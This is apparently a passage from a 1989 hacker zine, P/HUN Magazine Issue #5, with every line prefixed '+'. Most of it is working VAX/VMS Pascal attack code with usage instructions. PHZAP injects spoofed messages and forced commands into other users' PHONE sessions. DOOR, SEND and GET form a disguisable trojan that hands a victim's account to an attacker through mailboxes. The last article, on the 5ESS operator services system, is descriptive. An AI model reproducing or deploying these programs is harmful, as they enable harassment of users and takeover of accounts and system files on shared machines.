+program is meant to show what CAN be done with the VAX/VMS PHONE program,
+and is a working program solely for the purpose of showing that it CAN be
+done.
+    Sometime in 1986 or 1987, a friend of mine quit a job working with a
+record company.  In the process of leaving, he managed to pick up a copy
+of the VAX/VMS 4.0 source code on microfiche.  Since then, he has gotten
+2 more editions.  He unfortunately doesn't understand the code, but just
+likes to have it around as proof of his "abilities."  Once he acquired a
+second copy of the code, I requested his earlier edition.  He gave it to
+me freely.
+    In the middle of 1988, a "user" at my local college approached me and
+said that his PHONE conversations were being tapped.  I laughed, and told
+them that it was impossible.  They persisted, and thus I foraged into the
+realm of VMS PHONE discovery.   Upon reading the source code for PHONE, I
+discovered that it was the funniest, and most interestingly written  (and
+commented) program in the deck.  I discovered that, 1) PHONE was designed
+with a RECORD feature that would allow users to record conversations (and
+inform the other  party that a recording was occurring),  and that 2) the
+mailboxes created by the phone  program were completely world accessible,
+as well as being  easily discovered;  and that 3) for some reason DEC had
+commented out ONE LINE from PHONE,  making it unable to RECORD, but still
+including the code to do so in the program.
+     The other thing that was in the PHONE source was a list of the control
+codes that would force the program to do various things.  Surprisingly, the
+commands typed at the keyboard were treated the same as characters recieved
+through the mailboxes.   Needless to say, I immediately started considering
+ways to access them.   After a bit of debugging,  hacking, and causing some
+horrible errors to appear on other people's terminals, the program here was
+written.
+     The first program is the actual PASCAL source code for the message
+sender; the next program is the  .CLD file you should create to use the
+program;  the next thing is a list of the format and the method used in
+creating your own file to send.  The last file is a few sample files to
+be created to demonstrate the things that can be done.
+     An interesting point is that the CALLING user creates the mailbox
+FOR the called user.  This means that an answering machine program can
+be written that will recieve messages, and hang up without needing the
+user to watch over it.  Of course the user must be logged in, but they
+need not recieve phone calls to get their messages!   I have written a
+program to do this, and it may be published in the future.
+     Oh yes, the method for finding out what users are currently using
+the phone system is to:
+                       SHOW LOG PHN$*/SYS
+This works because PHONE creates systemwide logical names formatted as
+PHN$<username>.
+     The following is the method for using the PHZAP program...  Lines that
+begin with ';' are comments...
+ 
+$ SET COMMAND PHZAP
+;  This enables the command...
+$ SHOW LOG PHN$*
+   "PHN$GOD" = "_MBAxxx"
+   "PHN$DEVIL" = "_MBAxxx"
+;  As I just said, that lists out who's using the system...
+ 
+$ ZAP GOD/TYPE=MSG/MESSAGE="Personally?  I think you goofed off for six days"
+$ ZAP GOD/TYPE=MSG/MESSAGE=" then pulled an all-nighter!~"
+;  Drops up the message on His screen.
+ 
+$ ZAP DEVIL/TYPE=MSG/MESSAGE="\And I said, Let There Be Light!  And YOU got"
+$ ZAP DEVIL/TYPE=MSG/MESSAGE="hung up!"
+$ ZAP DEVIL/TYPE=CMD/MESSAGE="HANGUP"
+;  Places the message on It's screen, then forces It to HANGUP.
+ 
+$ ZAP GOD/TYPE=CMD/MESSAGE="HELP SWITCH_HOOK"
+;  This command teaches Him a bit about Switch Hooks, by forcing Him into
+;  help...
+ 
+--------------------------------------------------------------------------
+     If you get the feeling that I'm a bit anti-religious, and that those
+capital letters are smotheringly sarcastic...  You're smarter than you
+look!
+---------------------------------------------------------------------------
+PHZAP.PAS follows:
+ 
+[ INHERIT( 'SYS$LIBRARY:STARLET' ) ]
+{*************************************************************************}
+{*    If you are going to use this program, please leave this message    *}
+{*    in the file.  When referring to this program, give credit where    *}
+{*    credit is due.                                                     *}
+{*                                                --  Baliord            *}
+{*************************************************************************}
+ 
+program Phone_Phool(output,phzap);
+ 
+const
+  max = 132;
+ 
+  type
+    string_type = VARYING[ MAX ] OF CHAR;
+    word_type = [ word ]0..65535;
+ 
+  var
+    MAILBOX_NAME : STRING_TYPE;
+    mailbox_channel : word_type;
+    MsgStr,Send_File, command, mailbox_device_name : string_type;
+    length : integer;
+    phZAP: text;
+ 
+[external,asynchronous] procedure cli$get_value  (
+          entity: packed array [$L7..$U7:integer] of char := %immed 0;
+          var retdesc : Varying [$R0] of char) ; external;
+ 
+[ asynchronous ]
+function lib$sys_trnlog( %descr logical_name : varying[ l1 ] of char;
+                         %ref name_length : integer := %immed 0;
+                         %descr equivalence : varying[ l2 ] of char;
+                         %ref table : integer := %immed 0 ) : integer;
+external;
+ 
+[external,asynchronous] function cli$present(
+         entity: packed array [$L7..$U7:integer] of char := %immed 0):Integer;
+external;
+ 
+{
+  The following procedure checks to find out who you want hit with a message,
+  and opens their phone mailbox and sends the command to it.
+}
+ 
+Procedure Send(Command:String_Type);
+ Begin
+    Cli$get_value('USER',Mailbox_Name);
+    Mailbox_Name:='PHN$'+Mailbox_Name;
+    if lib$sys_trnlog(mailbox_name,length,mailbox_device_name)>ss$_normal then
+      writeln( 'Mailbox ', mailbox_name, ' does not exist.' )
+    else
+      begin
+        mailbox_device_name.length := length;
+        $assign( mailbox_device_name, mailbox_channel );   { Assign channel }
+        $qio( , mailbox_channel, io$_writevblk + io$m_noformat + io$m_now,
+          ,,, command.body, command.length, );         { Send command. }
+      end;
+  End;
+ 
+{
+   This procedure adds the "smb_cmd" (symbiont Command) function to the
+   beginning of a message.  This forces the message you send to be interpreted
+   by PHONE as a command typed by the user.
+}
+ 
+Procedure Snd_Cmd(Y:String_Type);
+  Var X:Integer;
+  Begin
+    Y:=Y+chr(13);
+    Y:=chr(3)+Y+chr(0);
+    Send(Y);
+  End;
+ 
+{
+   Here we convert the string from the plaintext given by the ZAPper to the
+   string that will be sent to the poor desperate user.  It converts the
+   '~' character into a carraige return, the '\' into a ^L (which clears the
+   screen) and the "|" into a ^W which repaints the screen.
+}
+ 
+Procedure Snd_Msg(Y:String_Type);
+  Var X:Integer;
+  Begin
+    X:=1;
+    While X<>0 do
+    Begin
+      X:=Index(Y,'~');
+      If X<>0 then Y[X]:=chr(13);
+    End;
+    X:=Index(Y,'\');
+    If X<>0 then Y[X]:=chr(12);
+    X:=Index(Y,'|');
+    If X<>0 then Y[X]:=chr(23);
+    Y:=chr(2)+Y+chr(0);
+    Send(Y);
+  End;
+ 
+Begin  (** MAIN PROGRAM **)
+ 
+    if cli$present('MESSAGE')<>229872 then cli$get_value('MESSAGE',msgstr);
+     { If the person is sending a message then it will be in the MSG area. }
+ 
+    if cli$present('TYPE')<>229872 then cli$get_value('TYPE',Send_File) else
+       Send_File:='ACCVIO.PHN';
+     { If the /TYPE= is not specified then it tries to force the user's PHONE
+       program to crash with an ACCESS VIOLATION...  (a nice, frightening
+       trick to play on a poor user.  It is normally possible to send a file
+       through this command, BUT you must know the format...
+     }
+ 
+    IF SEND_FILE='CMD' then SND_CMD(MSGSTR) ELSE
+      If Send_File='MSG' then SND_MSG(MsgStr) Else
+         BEGIN
+           if Index(Send_File,'.')=0 then Send_File:=Send_File+'.PHN';
+           Cli$get_value('USER',Mailbox_Name);
+           Mailbox_Name:='PHN$'+Mailbox_Name;
+           if lib$sys_trnlog(mailbox_name,length,mailbox_device_name)>
+ss$_normal then
+              writeln( 'Mailbox ', mailbox_name, ' does not exist.' )
+           else
+           begin
+             OPEN(FILE_VARIABLE:=PHZAP
+                 ,FILE_NAME:=SEND_FILE
+                 ,HISTORY:=OLD
+                 ,DEFAULT:='[]'); {  Replace this with the default dir }      
+                                     {  you will be most often using...}
+ 
+             mailbox_device_name.length := length;
+ 
+             $assign( mailbox_device_name, mailbox_channel );   
+{ Assign channel }
+ 
+             reset(phZAP);
+                repeat
+                   readln(phZAP,command);
+ 
+                   $qio( , mailbox_channel, io$_writevblk + io$m_noformat 
++ io$m_now,
+                        ,,, command.body, command.length, );         { 
+Send command. }
+ 
+                until eof(phZAP)
+           end;
+         END;
+end.
+ 
+------------------------------------------------------------------------------
+PHZAP.CLD follows:
+ 
+MODULE PHZAP_COMMAND
+Define Verb Zap
+       Image      "[{directory}]PHZAP.EXE"
+;                     ^^  Convert this to the directory the program will be in
+;                         and then delete these three lines.
+;
+       Qualifier  Type,Value
+       Parameter  P1,Label=User,Value(Required),Prompt="Username"
+       Qualifier  Message,Value
+ 
+-----------------------------------------------------------------------------
+    The format for a simple file is <cmd-char>NODE::USERNAME<CHR(0)><msg-char>
+ 
+    You can force a message to a person's screen by one of two methods,
+the first is using the above format and writing your message in the <msg-char>
+section of the packet using <listen>.  This requires writing it character by
+character.  The other option is to send the KBD_ROUTE command along with the
+message in normal text (with a <CHR(0)> at the end of course.)
+    The CMD_PARSE command allows you to force a command on the user, through
+their PHONE program.  It only works for commands within PHONE, however, so
+you cannot make them log out or such, only kick them out of phone.
+    The ANSWERED flag is useful in writing an answering machine, in that you
+send <answered>NODE::<answering user><CHR(0)> and the calling PHONE program
+will pop up the second screen as if the person had answered.  BUSY is also
+a nice one to be able to send (as well as rejected!)
+    If you send a <hangup>NODE::<hanging user><CHR(0)> ONLY THE USER YOU HIT
+with PHZAP will see that user as hung-up!  The other user (who supposedly
+hung up) will still see the other user listed on their screen!  (Nothing
+typed will reach them of course, but it is an interesting mindfuck!)
+    The <facsimile><msg-text><CHR(0)> is (if I remember correctly) the proper
+method for FAXing something over the VAX PHONE.
+    The <held>NODE::<holding user><CHR(0)> command puts the user you hit on
+HOLD in that user's eyes, but not to the "holding user."
+    Sending a <forced-link>NODE::<user #1><CHR(0)>NODE::<user #2><CHR(0)> will
+pretend to create a link between the user you are ZAPping and user #2.  Both
+users **MUST** be logged in, but not necessarily in PHONE!  Thus you can force
+a link between a user and <login> just to freak them out!  An example of this
+is given below.
+    The codes I haven't discussed are either too weird/complex to handle
+easily, or I just don't know how to use them.  (or have never bothered.)
+ 
+kbd_get      = chr (1);
+kbd_route    = chr (2);
+cmd_parse    = chr (3);
+talk         = chr (4);
+help2        = chr (5);
+ring_out     = chr (6);
+slave_verify = chr (7);
+rang_in      = chr (8);
+hangup       = chr (9);
+busy         = chr (10);
+answered     = chr (11);
+rejected     = chr (12);
+slave_done   = chr (13);
+listen       = chr (14);
+directory2   = chr (15);
+facsimile2   = chr (16);
+forced_link  = chr (17);
+held         = chr (18);
+unheld       = chr (19);
+ 
+----------------------------------------------------------------------------
+Some sample .PHN files follow...  <nn> is used to refer to <CHR(nn)>...
+ 
+FOFF.PHN
+<04>Lemme ALONE dammit!!<00>
+ 
+    This drops a message in the users OWN message area as if he had typed it
+to send to somebody.  They don't even have to be connected to somebody for
+you to do this.  It's most useful when someone is calling you and you want
+to tell them to call back later.
+ 
+FYOU.PHN
+<14>HEAVEN::GOD<00>F
+<14>HEAVEN::GOD<00>u
+<14>HEAVEN::GOD<00>c
+<14>HEAVEN::GOD<00>k
+<14>HEAVEN::GOD<00>
+<14>HEAVEN::GOD<00>Y
+<14>HEAVEN::GOD<00>o
+<14>HEAVEN::GOD<00>u
+<14>HEAVEN::GOD<00>!
+ 
+    This sends a message to a user in the standard way, as if someone had
+typed it.  This is also the method that is in the mailboxes used by PHONE,
+so if you want to write an answering machine, you have to parse that pattern.
+ 
+ACCVIO.PHN
+<15>HEAVEN::GOD<00>
+ 
+    That causes Acess Violation errors to flow down the users screen.  Don't
+ask me why; I don't know.  Does it under V4.6 of VMS, others I'm not sure.
+ 
+LINKUP.PHN
+<16>HEAVEN::DEVIL<00>HEAVEN::GOD<00>
+ 
+    After send that to a user's mailbox, their screen should flash with the
+"DEVIL has created a conference call with GOD" message.  Both users MUST exist
+and be logged on currently.  If you want to add yourself into a conversation
+go into phone, have someone "link" you with their conversation and then have
+someone link them with you...  It must be done to both.  Of course you could
+always use this...
+ 
+ANSWER.PHN
+<03>ANSWER<0>
+ 
+    That will force an ANSWER command from the keyboard into the COMMAND
+buffer.  If you have a friend do that to them, as you are phoning them, then
+they will be connected without the chance of them rejecting!  <Then you have
+your friend start linking all the phone conversations on the system by one
+person each!>
+ 
+     I think that's enough examples for you to be able to figure out the
+format for the rest yourself.
+ 
+     If you have questions about this, or any other program you have seen
+my name on, or you have VAX specific questions, I am available on The Toll
+Center BBS @ (718) 358-9209 and the Rogue's Gallery BBS @ (516) 361-9846.
+ 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+                Baliord's VMS Tricks Vol 2: DOOR
+                --------------------------------       
+                          By  Baliord
+
+
+                  Phile #7 of P/HUN Magazine Issue #5
+
+    The following program was designed to be an example of the use of
+VAX/VMS Mailboxes for multi-process control.  Any use of the program
+is the responsibility of the person compiling and/or running the
+program.
+ 
+    In this file, we look at the use of VMS's Mailbox facilities.  The VMS
+Mailbox was designed as a way of assisting interprocess communication for
+non-priviledged users.  An example of a program that uses the MBX facility
+is PHONE.  PHONE uses the mailboxes, along with system-wide logical names, to
+allow users to send information packets back and forth.
+    In the last file I discussed how to take advantage of PHONE's "open"
+logical names for confusing users.  In this installation, you will see how
+MBX's are VERY useful in taking over people's accounts.
+    This program is called DOOR (a name given it by CW, a very helpful friend
+who doesn't have a handle), and it allows the "default_control" user to control
+the account of any person who runs this program.
+    The code does the following:
+ 
+1)  The control_user string is set to the user who will recieve the MAIL that
+this user is now "accessible."
+ 
+2)  The MBX's necessary are created, using the INDOOR and OUTDOOR logical
+names as storage area for the MBAxxx: strings.  (If the person already has
+INDOOR and OUTDOOR defined in their main process, then the program will NOT
+work.)
+ 
+3)  The program waits 1 second, to assure that the MBX's have time to become
+registered with the system.
+ 
+4)  INDOOR and OUTDOOR are converted back from logical names to the actual
+device names so the control_user can be told what they are.
+ 
+5)  The process is spawned off with the first command being to tell the
+control_user what the MBX numbers are.
+ 
+6)  The program then ends.  (At this position, an interesting thing to put
+might be a chain to whatever program name you call it with the version number
+as -1.  I.E.  DOOR.EXE;-1 would be the program you chain to.  Then the program
+would, in effect, create the process, then execute a real program.)
+ 
+     The control_user must then read their mail and create two MBX's that
+correspond to the information given in the mail.
+I.E.
+    OUTDOOR=_MBA211: INDOOR=_MBA212:
+would be ASSIGNED at the DCL level as ASSIGN MBA211: OUTDOOR and
+                                      ASSIGN MBA212: INDOOR
+This must be done before the next two programs can be run.
+ 
+     The next two programs are, in order, the SEND program and the program to
+GET the information.
+ 
+     The SEND program assumes that you have entered a
+SEND:==$[directory]SEND.EXE
+                           command.  It takes whatever you typed after the
+SEND command and sends it through to the INDOOR mailbox.  The directory in
+the definition above is the directory you are keeping the SEND program in.
+ 
+     The GET program is the next program, and can be run directly.  Or you
+can create a
+GET:==$[directory]GET.EXE
+                         command.
+ 
+     The process for operation is illustrated here.
+ 
+$ mail
+ 
+You have 1 new message.
+ 
+MAIL>
+    #1          23-JUL-1989 02:08:03                              NEWMAIL
+From:   HEAVEN::DEVIL     "Heaven doesn't wan't me, so I took over Hell."
+To:     GOD
+Subj:   OUTDOOR=_MBA230: INDOOR=_MBA231:
+ 
+ 
+MAIL>  Exit
+$ assign MBA230: outdoor
+$ assign MBA231: indoor
+$ send dir *.com
+$ get
+ 
+Directory DRC0:[HELL.DEVIL]
+ 
+LOGIN.COM;1
+ 
+Total of 1 file.
+$ send mail comp.com god
+$
+New mail on node HEAVEN from DEVIL     "Heaven doesn't want me, so I took over Hell."
+$ get
+$ send dir sys$system:*.dat
+$ get
+ 
+Directory SYS$SYSROOT:[SYSEXE]
+ 
+DNAMES.DAT;1        MODPARAMS.DAT;1     NETCIRC.DAT;1       NETCONF.DAT;1
+NETLINE.DAT;1       NETLOGING.DAT;1     NETNODE.DAT;1       NETNODE_LOCAL.DAT;1
+NETNODE_REMOTE.DAT;1                    NETOBJECT.DAT;1     OLDSITE1.DAT;4
+OLDSITE2.DAT;5      OLDSITE3.DAT;5      OLDSITE4.DAT;5      PARAMS.DAT;5
+SDAT.DAT;1          SETPARAMS.DAT;5     SPSSERR.DAT;4       SPSSINFO.DAT;4
+SPSSUDF9.DAT;1      USAGE.DAT;1
+ 
+Total of 21 files.
+ 
+Directory SYS$COMMON:[SYSEXE]
+ 
+FAKE.DAT;1          JBCSYSQUE.DAT;1     MODPARAMS.DAT;1     RIGHTSLIST.DAT;1
+SYSUAF.DAT;1        VMSMAIL.DAT;1       VMSPARAMS.DAT;1
+ 
+Total of 7 files.
+ 
+Grand total of 2 directories, 28 files.
+$ send stop/id=0
+$ sho sys/subproc
+$
+ 
+ 
+     I think that's enough examples for you to be able to figure out what
+else to do yourself.
+ 
+
+DOOR.PAS follows:
+ 
+{
+ 
+DOOR
+Copyright (c) 1989 by Baliord and CW
+ 
+     This program creates a subprocess with input and output being directed
+     to Mailboxes.  It is originally intended for use only as a demonstration
+     of the power of mailboxes.  The authors take no responsibility for the
+     mischevious or dangerous use of this program.  It is only designed as
+     an example of what CAN be done, and is not expected to be actually used.
+ 
+}
+ 
+[ INHERIT( 'SYS$LIBRARY:STARLET' ) ]
+program door( input, output );
+ 
+const
+  max = 132;
+  default_control = 'GOD';          { default user that gets mail message }
+  inbox = 'INDOOR';                 { Logical name (must be capital). }
+  outbox = 'OUTDOOR';               { Logical name (must be capital). }
+ 
+type
+  word_type = [ word ]0..65535;
+  string = VarYING [ MAX ] of char;
+ 
+Var
+  subject, user, mail_command, control_user, outdev, indev : string;
+  inchannel, outchannel : word_type;  { mailbox channels }
+  a, length : integer;
+ 
+    [ asynchronous ]
+    function lib$sys_trnlog( %descr logical_name : varying[ l1 ] of char;
+                             %ref name_length : integer := %immed 0;
+                             %descr equivalence : varying[ l2 ] of char;
+                             %ref table : integer := %immed 0 ) : integer;
+      external;
+ 
+    [ asynchronous ]
+    function lib$spawn( %descr command : varying[ l1 ] of char := %immed 0;
+                        %descr inp : varying[ l2 ] of char := %immed 0;
+                        out : varying[ l3 ] of char := %immed 0;
+                        %ref flags : integer := %immed 0;
+                        %descr process_name : varying[ l4 ] of char := %immed 0;
+                        %ref pid, status, efn : integer := %immed 0;
+                        [ unbound, asynchronous ]
+                        procedure ast( %immed p1 : [ unsafe ]integer ) := %immed 0;
+                        ast_parameter : [ unsafe ]integer := %immed 0;
+                        prompt : varying [l5] of char := %immed 0;
+                        cli : varying [l6] of char := %immed 0 ) : integer;
+      external;
+ 
+procedure sleep(t : real);              (* program will sleep 't' *)
+var                                     (* seconds. *)
+    t1 : real;
+ 
+begin
+      t1:=clock/1000;
+      t:=t1+t;
+      while t1<t do
+          t1:=clock/1000;
+end;
+ 
+begin
+  control_user := default_control;
+ 
+  $crembx(  , inchannel, max, 1000, 0, , inbox );    { Create input mailbox. }
+  $crembx(  , outchannel, max, 1000, 0, , outbox );  { Create output mailbox. }
+ 
+  sleep( 5 );                                           { Wait for mailbox to be created. }
+ 
+  lib$sys_trnlog( inbox, length, indev );             { get device name }
+  indev.length := length;
+ 
+  lib$sys_trnlog( outbox, length, outdev );           { get device name }
+  outdev.length := length;
+ 
+  mail_command:= 'MAIL/NOSELF NL: ' + control_user + '/SUBJECT="' + 'OUTDOOR=' + indev + ' INDOOR=' + outdev + '"';
+ 
+  lib$spawn( mail_command, inbox, outbox, cli$m_nowait );  { Spawn process. }
+ 
+end.
+-----------------------------------------------------------------------------
+SEND.PAS follows:
+ 
+{
+ 
+SEND
+ 
+Copyright (c) 1989 by Baliord and CW
+ 
+     This program was designed explicitly to send information to a MBX.  It
+     was originally designed to work with the DOOR program.  The authors take
+     no responsibility for the ignorant or malicious use of this program.  It
+     is designed as a sample of what CAN be done with certain features of the
+     VMS operating system.  It is only designed as a sample, and is not
+     intended for use.
+ 
+}
+ 
+[ INHERIT( 'SYS$LIBRARY:STARLET' ) ]
+program send_slave( output );
+ 
+  const
+    mailbox_name = 'OUTDOOR';  { Logical name (must be capital). }
+    max = 132;
+ 
+  type
+    string_type = VARYING [ MAX ] OF CHAR;
+    word_type   = [ word ]0..65535;
+ 
+  var
+    mailbox_channel : word_type;
+    command, mailbox_device_name : string_type;
+    length : integer;
+ 
+    [ asynchronous ]
+    function lib$sys_trnlog( %descr logical_name : varying[ l1 ] of char;
+                             %ref name_length : integer := %immed 0;
+                             %descr equivalence : varying[ l2 ] of char;
+                             %ref table : integer := %immed 0 ) : integer;
+      external;
+ 
+    [ asynchronous ]
+    function lib$get_foreign( %descr string : varying[ l1 ] of char;
+                              %descr prompt : varying[ l2 ] of char := %immed 0;
+                              %ref out_length, force : integer := 0 ) : integer;
+      external;
+ 
+  begin
+    if lib$sys_trnlog(mailbox_name,length,mailbox_device_name)>ss$_normal then
+      writeln( 'Mailbox ', mailbox_name, ' does not exist.' )
+    else
+      begin
+        mailbox_device_name.length := length;
+        $assign( mailbox_device_name, mailbox_channel );   { Assign channel }
+        lib$get_foreign( command );                        { Get command }
+        $qio( , mailbox_channel, io$_writevblk + io$m_noformat + io$m_now,
+              ,,, command.body, command.length, );         { Send command. }
+      end;
+  end.
+-----------------------------------------------------------------------------
+GET.PAS follows:
+ 
+{
+ 
+GET
+ 
+Copyright (c) 1989 by Baliord
+ 
+     This program was designed to read the output from a MBX.  In particular
+     it is made to work with the DOOR program.  The use of this program is
+     not the responsibility of the authors of the program, as that it is
+     designed as an example of what CAN be done.  It is not intended to be
+     actually used.
+ 
+}
+ 
+[ INHERIT( 'SYS$LIBRARY:STARLET' ) ]
+program read_slave( input,output );
+ 
+  const
+    mailbox_name = 'INDOOR';  { Logical name (must be capital). }
+    max = 132;
+ 
+  type
+    word_type = [ word ]0..65535;
+    string_type = VARYING[ MAX ] OF CHAR;
+ 
+  var
+    iosb            : array [1..2] of integer;
+    mailbox_channel : word_type;
+    ret,command, mailbox_device_name : string_type;
+    length : integer;
+ 
+    [ asynchronous ]
+    function lib$sys_trnlog( %descr logical_name : varying[ l1 ] of char;
+                             %ref name_length : integer := %immed 0;
+                             %descr equivalence : varying[ l2 ] of char;
+                             %ref table : integer := %immed 0 ) : integer;
+      external;
+ 
+  begin
+    if lib$sys_trnlog(mailbox_name,length,mailbox_device_name)>ss$_normal then
+      writeln( 'Mailbox ', mailbox_name, ' does not exist.' )
+    else
+      begin
+        $assign( mailbox_device_name, mailbox_channel );   { Assign channel }
+        repeat
+          command.body:='';
+          mailbox_device_name.length := length;
+          $qio(,mailbox_channel,io$_readvblk+io$m_now,iosb,,,command.body,80);
+          command.length:=80;
+          if iosb[1]<>ss$_endoffile then writeln(command);
+        until iosb[1]=ss$_endoffile;
+      end;
+  end.
+
+
+ This file was produced specifically for the uses of P/HUN magazine and its
+ editor.  Any publication outside of that magazine, or distribution seperate
+ from that magazine without the express written approval of the author of
+ this document OR THE EDITOR OF P/HUN MAGAZINE is in violation of the author's
+ wishes. The only exception to this is that you are free to load these files
+ onto systems for compilation.  However, if you are going to use them, you MUST
+ leave the comments intact.  When referring to this program, give credit
+ where credit is due.  ALWAYS leave the disclaimers intact.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+                        A New Operator Service                                 
+                        ----------------------
+                      Feature For The 5SS Switch :
+                      ----------------------------
+                    OPERATOR SERVICES POSITION SYSTEM
+                    ---------------------------------
+                   Phile #8 of P/HUN Magazine Issue #5
+                  
+                             By  Bandito    
+
+A new operator services system for the 5ESS switch gives phone companies and
+worldwide phone service administrators unparalleled flexibility in deploying
+operators.  The system is called the Operator Services Position System (OSPS),
+and it's operation is based on the Intergrated Services Digital Network (ISDN)
+capabilities of the 5ESS switch.  These capabilities permit simultaneous data
+and voice communications between the switch and the operator's terminal
+equipment.
+     OSPS allows the phone service providers to provide full-featured North
+American and international operator service with operators located a distance
+from the switching system.
+
+AT&T has added a new feature--the Operator Services Position System--to its
+5ESS switch.  A major difference between OSPS and the previous operator
+system--the Traffic Service Position System  (TSPS)--is OSPS's ability to
+provide several applications simultaneously on one switching system.  One
+Switch with OSPS can serve up to 128 teams of operators handling different
+applications, such as directory, toll, and operator assistance.
+     The OSPS can be deployed as a stand-alone system or integrated with a
+local, toll or gateway 5ESS switch.  For directory assistance, a basic services
+terminal and a Directory Assistance System/Computer provide the directory
+listing.  A video display terminal helps with charging and completing toll and
+assistance calls.  In some applications, the OSPS supplies data from external
+computer systems at the operator terminal.  The OSPS can also offer fully
+automated services such as Automated Calling Card or Automated Coin Services. 
+It does this by linking to network data bases to validate credit or calling
+card numbers, and to determine the charging rates.
+      For international applications, OSPS provides the international features
+used in local, transit, and gateway applications,  For these applications, the
+system makes available services such as call booking(thats when you say that
+you want to make a call to Russia and the operator say "I'll call you in 5
+hours so you can place the call, ok?"), and it can handle various types of
+international trunking and signaling.
+
+DESIGN OBJECTIVES
+
+     Besides providing state-of-the-art operator services, OSPS also improves a
+phone company's financial results by reducing operator, administrative, and
+maintenance costs, improving network design efficiency, and creating new
+revenue opportunities.
+
+Operator Expense     
+     Reducing the average amount of time operators take to handle a call can
+cut expenses by millions of dollars.  A major effort, therefore, was devoted to
+achieving this.  Attention to human-machine interfaces led to operator
+positions that reduce the motions and concentration needed for each function. 
+For toll and assistance, for example, the video display terminal improves the
+position of information on the monitor screen and the grouping of action keys. 
+The display terminal also has single keys that are set up to perform complete
+functions.  This results in faster action and reduces operator stress.(I hope
+this will help them get a better atitude) 
+     To speed things up, the OSPS automates operator tasks associated with call
+handling.  Paper records and information bulletins are eliminate by 
+computerized ticketing and an automated multileaf bulletin.  Since a
+significant portion of operator work time is normally spent in determining if a
+line is busy and waiting for answer, this portion of the call can be automated.
+Future releases of the system will allow operators to handle other calls during
+these periods.
+
+Administrative and Maintenance Expense
+     Since OSPS is a feature of the 5ESS switch, administrative and maintenance
+expense is reduced by making common use of the base 5ESS switch capabilities
+and by using a common maintenance force.  The operator service center, where
+the operators are, may be located away from the host 5ESS switch.  Additional
+equipment, therefore, is provided to support administrative printers and
+terminals, and the management of the operators.
+     Such support comes from the OSPS administrative processor (OAP), an AT&T
+3B2 computer.  Expense is minimized by allowing one administrative processor to
+support as many operator services centers as the phone company desires; not too
+many of these are need. Only one OAP is needed for every switch.  Most
+commercial automatic call distributor applications use some type of manegement
+information system (MIS) to provide similar administrative control and
+reporting as does the OAP ofr OSPS.  Overall, administrative expense is reduced
+by allowing several teams of operators and several types of calls to be
+administered together.
+
+Network Design Efficiency
+     The 5ESS switch with remote integrated services line units allow operator
+service centers to be hundreds of miles from the host switch.  OSPS can be
+added to a 5ESS switch dedicated to operator services with any combinationn of
+different applications, or integrated into a network switch serving other
+gateway, toll, tandem, or local traffic.  If initial operator needs are small,
+a single switch could serve just a few operator positions. (Because of the
+modular design of the switch, the number of operator on one switch could grow
+one by one until they got over 100. There could be as many as 128 teams of
+operators handling a total of nearly 100,000 calls an hour.
+     One OSPS can handle call processing and a second OSPS can handle operator
+assistance.  This can be a permanent arrangement to minimize new operator
+trunks and/or the number of sites staffed with operators.  It is also possible
+to reconfigure operator teams.  Entire OSPS systems or selected teams can be
+closed down during periods of low traffic.  Calls are then directed to other
+teams or another OSPS in the network.  Because of these capabilities, the
+network can be redesigned continuously to meet changing needs.
+
+More Service Opportunities
+     The OSPS is based on ISDN capabilities and open interfaces that support
+customization, customer independence, and flexiblilty.  ISDN supplies
+packet-switched access to data bases, as well as interfaces to operator
+terminals and support systems.  The open interfaces make it easy to add new
+services and to support multiple interchange and local exchange carriers.  Data
+can be sent to the operator terminal from computer systems external to the
+switch, allowing an operator to talk with a caller while receiving data from a
+remote data base.  Both the data base information and the telephone information
+can be displayed using the windowing capabilities of OSPS video display
+terminals.
+
+SYSTEM ARCHITECTURE
+
+     The OSPS was designed and built on the existing ISDN architecture of the
+5ESS switch.  The switch consists of three major hardware modules, handling
+administration, communications, and switching.  There are two types of
+switching modules, one for normal voice calls, and another, an ISDN module, for
+voice and data.  The ISDN switching module is the interface between operators
+and the switch.
+     The administrative module provides system administration functions,and
+supports automatic calll distribution to operators for each OSPS application. 
+Hardware and software are added to the basic switch to perform automated and
+manual operator functions.  Different types of operator terminals are furnished
+for different OSPS applications.  An OSPS administrative processor is available
+to support each particular application.  The terminals allow operator to
+receive and control calls, and to send and receive data through the switch. 
+Functionally, these are ISDN terminals with simultaneous voice and data
+communications capability.
+      The terminals are connected by digital subscriber lines to the switch's
+integrated services line unit (ISLU) or to a remote ISLU (RISLU) when the
+operator services center is a distance from the host switch.  The ISLU or RISLU
+acts as an operator position controller.  Operator terminals may be located
+several miles from the position controller, with the exact distance dependent
+on the application and type of interface.  Where the RISLU and multiplexed onto
+digital facilities that connect to the host 5ESS switch.
+
+Systems Interfaces and External Data Bases
+     For directory assistance, the 5ESS switch communicates with a
+vendorsupplied Directory Assistance System Computer (DAS/C).  In response to
+customer requests, the operator consults the system for directory listings. 
+Like the basic services terminal with which it works, the DAS/C can be
+connected to a RISLU and share the remoting capabilities with the basic
+services terminal or it can be connected directly to the ISLU.
+     The OSPS administrative proccessor is used for directory assistance as
+well as toll and assistance operation.  This processor is located in the
+operator services center and/or force management center.  It is used with
+administrative terminals and printers to support administration and managemnet
+personnel by providing traffic, performance, and operator team data when
+requested.
+     The OSPS connects to other vendor or phone company data bases as well as
+to other 5ESS switches.  The connections to other switches make available
+remote capability for complete call handling.  The phone company may choose to
+use these connections as paths between switches to provide call processing at
+the originating switch and operator services at another switch.
+     The switch's common channel signalinng interface accesses a number of
+external data bases.  Network signaling interfaces unique to the international
+application are available to provide new features.  These interfaces vary from
+country to country.
+
+SYSTEM OPERATION
+
+     The heart of the OSPS is a full-featured, flexibly administered automatic
+call distributor (ACD).  A call coming into an OSPS is selected for a
+particular operator team based on its incoming trunk and the dialed digits. 
+The originating switching module determines the call type and gives the ACD the
+information needed to select the proper operator team.  If operators are
+available, the call is routed to one on the team who has been sitting one her
+ass the longest.  If an operator isn't available in that serving team, the ACD
+holds that call and the customer is sent a response (a ring, announcement,
+silence, music, etc.).  When an operator becomes available, the customer that
+has been on hold the longest is routed to the operator who hasnt had a call the
+longest.
+     For directory assistance, the operator asks for number-identifying
+information and then taps into the database.  The number is given to the
+customer by a recorded announcement or the operator.
+     For toll and assistance requests, the operator asks for charging
+information and the system handles charge recording and the call completion. 
+Alternate billing is verified and coins collected where appropriate.  Domestic
